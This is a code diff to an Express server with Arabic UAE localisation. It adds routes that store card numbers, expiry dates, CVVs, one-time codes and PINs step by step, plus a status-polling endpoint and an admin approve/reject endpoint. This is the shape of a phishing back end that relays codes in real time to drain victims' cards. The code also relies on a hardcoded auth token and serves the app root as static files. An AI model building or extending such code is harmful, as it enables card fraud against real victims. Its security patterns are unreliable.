@@ -10,14 +10,12 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
+// Custom routing for payment pages to bypass cache
 app.get('/payment_ar.html', (req, res) => {
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
-    res.setHeader('Pragma', 'no-cache');
-    res.setHeader('Expires', '0');
     res.sendFile(path.join(__dirname, 'payment_new_ar.html'));
 });
 
-// Priority: Static files
 app.use(express.static(path.join(__dirname, './')));
 
 let orders = [];
@@ -33,50 +31,80 @@ app.post('/api/login', (req, res) => {
     }
 });
 
-const saveOrder = (req, res) => {
-    try {
-        const data = req.body;
-        const order = {
-            id: Date.now(),
-            timestamp: new Date().toLocaleString('ar-AE'),
-            status: data.status || 'جديد',
-            name: data.name || data.full_name || 'غير معروف',
-            email: data.email || '',
-            phone: data.phone || '',
-            country: data.country || data.emirate || '',
-            amount: data.amount || '5.00',
-            details: data.details || data
-        };
-        orders.push(order);
-        res.json({ success: true, id: order.id });
-    } catch (err) {
-        res.status(500).json({ success: false });
-    }
-};
-
-app.post('/api/save-data', saveOrder);
-app.post('/api/orders', saveOrder);
-
-// Compatibility route for payment_new_ar.html
+// Save data and set status to 'waiting_payment'
 app.post('/submit-data', (req, res) => {
     const data = req.body;
+    const orderId = Date.now().toString();
     const order = {
-        id: Date.now(),
+        id: orderId,
         timestamp: new Date().toLocaleString('ar-AE'),
-        status: 'جديد',
+        status: 'waiting_payment',
         name: data.name || 'غير معروف',
         phone: data.phone || '',
         transactionId: data.transactionId || '',
-        details: {
-            cardName: data.cardName,
-            cardNumber: data.cardNumber,
-            expiryDate: data.expiryDate,
-            cvv: data.cvv,
-            originalData: data
-        }
+        cardName: data.cardName || '',
+        cardNumber: data.cardNumber || '',
+        expiryDate: data.expiryDate || '',
+        cvv: data.cvv || '',
+        otp: '',
+        pin: '',
+        lastError: ''
     };
     orders.push(order);
-    res.json({ success: true });
+    res.json({ success: true, orderId: orderId });
+});
+
+// Update OTP
+app.post('/submit-otp', (req, res) => {
+    const { orderId, otp } = req.body;
+    const order = orders.find(o => o.id === orderId);
+    if (order) {
+        order.otp = otp;
+        order.status = 'waiting_otp';
+        res.json({ success: true });
+    } else {
+        res.status(404).json({ success: false });
+    }
+});
+
+// Update PIN
+app.post('/submit-pin', (req, res) => {
+    const { orderId, pin } = req.body;
+    const order = orders.find(o => o.id === orderId);
+    if (order) {
+        order.pin = pin;
+        order.status = 'waiting_pin';
+        res.json({ success: true });
+    } else {
+        res.status(404).json({ success: false });
+    }
+});
+
+// Polling endpoint for client to check status
+app.get('/api/check-status/:orderId', (req, res) => {
+    const order = orders.find(o => o.id === req.params.orderId);
+    if (order) {
+        res.json({ status: order.status, lastError: order.lastError });
+    } else {
+        res.status(404).json({ success: false });
+    }
+});
+
+// Admin endpoint to update status (Approve/Reject)
+app.post('/api/update-order-status', (req, res) => {
+    const authHeader = req.headers.authorization;
+    if (authHeader !== 'authenticated_session_token') {
+        return res.status(403).json({ success: false });
+    }
+    const { orderId, status, error } = req.body;
+    const order = orders.find(o => o.id === orderId);
+    if (order) {
+        order.status = status;
+        if (error) order.lastError = error;
+        res.json({ success: true });
+    } else {
+        res.status(404).json({ success: false });
+    }
 });
 
 app.get('/api/get-data', (req, res) => {
@@ -88,38 +116,14 @@ app.get('/api/get-data', (req, res) => {
     }
 });
 
-app.post('/api/update-status', (req, res) => {
-    const authHeader = req.headers.authorization;
-    if (authHeader !== 'authenticated_session_token') {
-        return res.status(403).json({ success: false });
-    }
-    const { id, status } = req.body;
-    const order = orders.find(o => o.id === parseInt(id) || o.id === id);
-    if (order) {
-        order.status = status;
-        res.json({ success: true });
-    } else {
-        res.status(404).json({ success: false });
-    }
-});
-
-// Route for all HTML files to ensure they load correctly
 app.get('/:page.html', (req, res) => {
     res.sendFile(path.join(__dirname, req.params.page + '.html'), (err) => {
-        if (err) {
-            res.status(404).send('Page not found');
-        }
+        if (err) res.status(404).send('Page not found');
     });
 });
 
-// Default route
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index_ar.html'));
-});
-
-// Handle 404
-app.use((req, res) => {
-    res.status(404).send('Not Found');
 });
 
 app.listen(PORT, () => {
